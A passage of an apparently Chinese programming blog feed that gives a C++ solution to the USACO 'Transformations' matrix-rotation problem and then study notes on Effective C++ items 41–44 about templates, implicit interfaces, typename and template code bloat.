class="line"><span class="keyword">while</span> (cin &gt;&gt; tmp)</span><br><span class="line">&#123;</span><br><span class="line">total++;</span><br><span class="line"><span class="keyword">if</span> (tmp == flag)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">arr[i++] = count;</span><br><span class="line">flag = tmp;</span><br><span class="line">count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="built_in">sqrt</span>(total) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">0</span>; j &lt; i; j++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; arr[j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1205-USACO1-2-方块转换-Transformations"><a href="#P1205-USACO1-2-方块转换-Transformations" class="headerlink" title="P1205 [USACO1.2] 方块转换 Transformations"></a>P1205 [USACO1.2] 方块转换 Transformations</h3><p>转180度即转两次90度，转270次即转三次90度，我们可以通过90度旋转函数调用来实现图片旋转。</p><p>旋转矩阵我们可以通过先转置矩阵，然后再将第<code>i</code>行与<code>n-i</code>行进行交换，得到顺时针旋转90度的矩阵。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514203408143.png" alt="image-20240514203408143"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">15</span>;</span><br><span class="line"><span class="type">char</span> matrix[N][N];</span><br><span class="line"><span class="type">char</span> matrixcopy[N][N];</span><br><span class="line"><span class="type">char</span> matrix2[N][N];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转置矩阵</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">transpose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(matrix[i][j], matrix[j][i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 水平翻转</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reverseRows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n / <span class="number">2</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(matrix[i][j], matrix[i][n - j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顺时针旋转矩阵</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotateClockwise</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">transpose</span>();</span><br><span class="line">    <span class="built_in">reverseRows</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断结果</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">JudgeRes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] != matrix2[i][j]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化矩阵</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            matrix[i][j] = matrixcopy[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查旋转一次是否匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">rotateClockwise</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查旋转两次是否匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">rotateClockwise</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查旋转三次是否匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">rotateClockwise</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查水平翻转是否匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Init</span>();</span><br><span class="line">    <span class="built_in">reverseRows</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查旋转后水平翻转是否匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res5</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    <span class="built_in">res1</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">res2</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">res3</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查原始矩阵是否匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res6</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">Init</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">JudgeRes</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无操作，总是返回真</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">res7</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">judge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res1</span>()) &#123; cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res2</span>()) &#123; cout &lt;&lt; <span class="number">2</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res3</span>()) &#123; cout &lt;&lt; <span class="number">3</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res4</span>()) &#123; cout &lt;&lt; <span class="number">4</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res5</span>()) &#123; cout &lt;&lt; <span class="number">5</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res6</span>()) &#123; cout &lt;&lt; <span class="number">6</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">res7</span>()) &#123; cout &lt;&lt; <span class="number">7</span> &lt;&lt; endl; <span class="keyword">return</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            cin &gt;&gt; matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            matrixcopy[i][j] = matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            cin &gt;&gt; matrix2[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">judge</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x6</title>
      <link href="/2024/04/24/C&amp;C++/Effective%20Cpp0x7/"/>
      <url>/2024/04/24/C&amp;C++/Effective%20Cpp0x7/</url>
      
        <content type="html"><![CDATA[<h1 id="Templates-and-Generic-Programming"><a href="#Templates-and-Generic-Programming" class="headerlink" title="Templates and Generic Programming"></a>Templates and Generic Programming</h1><p>C++ template 机制自身是一部完整的图灵机C Turing-complete) ：它可以被用来计算任何可计算的值。于是导出了模板元编程(template metaprogramming) ，创造出“在C++编译器内执行并于编译完成时停止执行”的程序。</p><p>[toc]</p><h3 id="41-Understand-implicit-interfaces-and-compile-time-polymorphism"><a href="#41-Understand-implicit-interfaces-and-compile-time-polymorphism" class="headerlink" title="41. Understand implicit interfaces and compile-time polymorphism."></a>41. Understand implicit interfaces and compile-time polymorphism.</h3><p>面向对象编程世界总是以<code>显式接口(explicit interfaces)</code> 和<code>运行期多态(runtime polymorphism)</code>解决问题。</p><p>模板反倒是反倒是<code>隐式接口(implicit interfaces)</code>和<code>编译期多态(compile-time polymorphism)</code>移到前头了。</p><p>来看以下例子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Widget</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">Widget</span>();</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">Widget</span>();</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> std::<span class="type">size_t</span> <span class="title">size</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">normalize</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(Widget&amp; other)</span></span>;                 <span class="comment">// see Item 25</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以及这个（同样没有什么意义的）function（函数），</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">doProcessing</span><span class="params">(Widget&amp; w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (w.<span class="built_in">size</span>() &gt; <span class="number">10</span> &amp;&amp; w != someNastyWidget) &#123;</span><br><span class="line">      <span class="function">Widget <span class="title">temp</span><span class="params">(w)</span></span>;</span><br><span class="line">      temp.<span class="built_in">normalize</span>();</span><br><span class="line">      temp.<span class="built_in">swap</span>(w);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>由于w 的类型被声明为Widget, 所以w 必须支持Widget 接口。我们可以在源码中找出这个接口（例如在Wodget 的.h 文件中），看看它是什么样子，所以我称此为一个<code>显式接口(explicit interface)</code>，也就是它在源码中明确可见。</p></li><li><p>由于widget的某些成员函数是virtual, w 对那些函数的调用将表现出<code>运行期多态(runtime polymorphism)</code>，也就是说将于运行期根据w 的动态类型（见条款37)决定究竟调用哪一个函数。</p></li></ul><p>当我们将doProcessing 从<code>函数</code>转变成<code>函数模板(function template)</code> 时发生什么事：</p><p>现在我们怎么说doProcessing 内的w 呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename T&gt;</span><br><span class="line">void doProcessing(T&amp; w)</span><br><span class="line">&#123;</span><br><span class="line">  if (w.size() &gt; 10 &amp;&amp; w != someNastyWidget) &#123;</span><br><span class="line">     T temp(w);</span><br><span class="line">     temp.normalize();</span><br><span class="line">     temp.swap(w);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>w 必须支持哪一种接口，系由template 中执行千w 身上的操作来决定。本例看来w 的类型T 好像必须支持size,norrnalize 和swap 成员函数、copy 构造函数（用以建立temp) 、不等比较(inequality comparison, 用来比较someNasty-Widget) 。我们很快会看到这并非完全正确，但对目前而言足够真实。重要的是，这一组表达式（对此template 而言必须有效编译）便是T 必须支持的一组<code>隐式接口(implicit interface)</code>。</li><li>凡涉及w 的任何函数调用，例如operator&gt; 和operator!= ，有可能造成template具现化，使这些调用得以成功。这样的具现行为发生在编译期。“以不同的template 参数具现化function templates“ 会导致调用不同的函数，这便是所谓的<code>编译期多态(compile-time polymorphism)</code> 。</li></ul><p>显示接口于隐式接口的区别：</p><ul><li>显式接口由函数的签名式（也就是函数名称、参数类型、返回类型）构成。</li><li>隐式接口就完全不同了。它并不基于函数签名式，而是由有效表达式(valid expressions) 组成。即参数能通过隐式转换执行。</li></ul><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li>classes 和templates 都支持接口(interfaces) 和多态(polymorphism) 。</li><li>对classes 而言接口是显式的(explicit) ，以函数签名为中心。多态则是通过virtual函数发生于运行期。</li><li>对template 参数而言，接口是隐式的(implicit) ，奠基于有效表达式。多态则是通过template 具现化和函数重载解析(function overloading resolution) 发生于编译期。</li></ul><h3 id="42-Understand-the-two-meanings-of-typename"><a href="#42-Understand-the-two-meanings-of-typename" class="headerlink" title="42. Understand the two meanings of typename."></a>42. Understand the two meanings of typename.</h3><ul><li><p>在现代 C++ 编程中，<code>typename</code> 和 <code>class</code> 在模板参数声明中可以互换使用，但 <code>typename</code> 更准确地表达了模板参数是一个类型的意图。</p></li><li><p>从属名称是指在模板定义中依赖于模板参数的名称。这些名称只有在模板实例化时，即模板参数的具体类型被确定后，才能被解析。</p></li><li><p>嵌套从属名称是指在一个模板定义中，依赖于模板参数的名称嵌套在其他依赖于模板参数的名称之中。</p></li><li><p>任何时候当你想要在template 中指涉一个嵌套从属类型名称，就必须在紧临它的前一个位置放上关键字typename 。</p></li></ul><p>//TODO</p><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>声明template 参数时，前缀关键字class 和typename 可互换。</li><li>请使用关键字typename 标识嵌套从属类型名称；但不得在base class lists （基类列）或member initialization list （成员初值列）内以它作为base class 修饰符。</li></ul><h3 id="43-Know-how-to-access-names-in-templatized-base-classes"><a href="#43-Know-how-to-access-names-in-templatized-base-classes" class="headerlink" title="43. Know how to access names in templatized base classes."></a>43. Know how to access names in templatized base classes.</h3><p>前面的看一下书，意思就是派生类想调用模板父类的函数，只能在该父类被实例化后才能确定调用。因为父类可能针对特定情况进行了偏特化，而该特化没有此函数。</p><p>我们有三种做法解决这一问题：</p><p>通过<code>this-&gt;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Company&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoggingMsgSender</span>: <span class="keyword">public</span> MsgSender&lt;Company&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">sendClearMsg</span><span class="params">(<span class="type">const</span> MsgInfo&amp; info)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    write <span class="string">&quot;before sending&quot;</span> info to the log;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">sendClear</span>(info);                <span class="comment">//假设sendClear会被继承</span></span><br><span class="line"></span><br><span class="line">    write <span class="string">&quot;after sending&quot;</span> info to the log;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过<code>using声明式</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Company&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoggingMsgSender</span>: <span class="keyword">public</span> MsgSender&lt;Company&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">using</span> MsgSender&lt;Company&gt;::sendClear;   <span class="comment">//告诉编译器假设SendClear位于base clas</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">sendClearMsg</span><span class="params">(<span class="type">const</span> MsgInfo&amp; info)</span></span></span><br><span class="line"><span class="function">    <span class="title">sendClear</span><span class="params">(info)</span></span>;                     <span class="comment">//假设sendClear会被继承</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过<code>指出被调用的函数位于base class</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> Company&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoggingMsgSender</span>: <span class="keyword">public</span> MsgSender&lt;Company&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">sendClearMsg</span><span class="params">(<span class="type">const</span> MsgInfo&amp; info)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    MsgSender&lt;Company&gt;::<span class="built_in">sendClear</span>(info);     <span class="comment">//假设sendClear会被继承</span></span><br><span class="line">  &#125;                                          </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意如果是virtual函数，上述将关闭virtual绑定行为。</p><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><ul><li>可在derived class templates 内通过“this-&gt;” 指涉base class templates 内的成员名称，或藉由一个明白写出的“base class 资格修饰符“完成。</li></ul><h3 id="44-Factor-parameter-independent-code-out-of-templates"><a href="#44-Factor-parameter-independent-code-out-of-templates" class="headerlink" title="44. Factor parameter-independent code out of templates."></a>44. Factor parameter-independent code out of templates.</h3><p>使用template可能会导致代码膨胀。</p><p>我们可以使用一个听起来十分nb的方法<code>共性与变性分析(commonality and variability analysis)</code>，但其十分平民化。</p><p>例如我们会把类中相同（共性）的部分整合为父类，在子类中使用<code>继承和复合</code>来存放不同(变性)的部分。</p><p>现在，我们考虑一个矩阵：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,           <span class="comment">// 用于表示类型为 T 的对象的 n x n 矩阵的模板；请参阅下面有关 size_t 参数的信息</span></span><br><span class="line">         std::<span class="type">size_t</span> n&gt;        <span class="comment">// size_t 参数的大小，用于确定矩阵的大小</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareMatrix</span> &#123;           <span class="comment">// 方阵类定义</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">invert</span><span class="params">()</span></span>;               <span class="comment">// 将矩阵原地求逆</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考虑如下代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SquareMatrix&lt;<span class="type">double</span>, <span class="number">5</span>&gt; sm1;</span><br><span class="line">...</span><br><span class="line">sm<span class="number">1.</span><span class="built_in">invert</span>();                  <span class="comment">// 调用 SquareMatrix&lt;double, 5&gt;::invert</span></span><br><span class="line"></span><br><span class="line">SquareMatrix&lt;<span class="type">double</span>, <span class="number">10</span>&gt; sm2;</span><br><span class="line">...</span><br><span class="line">sm<span class="number">2.</span><span class="built_in">invert</span>();                  <span class="comment">// 调用 SquareMatrix&lt;double, 10&gt;::invert</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们肯定想优化他们，那么我们可以更改为带一个表示矩阵大小参数的函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;                   <span class="comment">// 用于表示方阵的大小无关的基类模板</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareMatrixBase</span> &#123;               <span class="comment">// 方阵的基类</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">invert</span><span class="params">(std::<span class="type">size_t</span> matrixSize)</span></span>; <span class="comment">// 对给定大小的矩阵进行求逆操作</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, std::<span class="type">size_t</span> n&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SquareMatrix</span>: <span 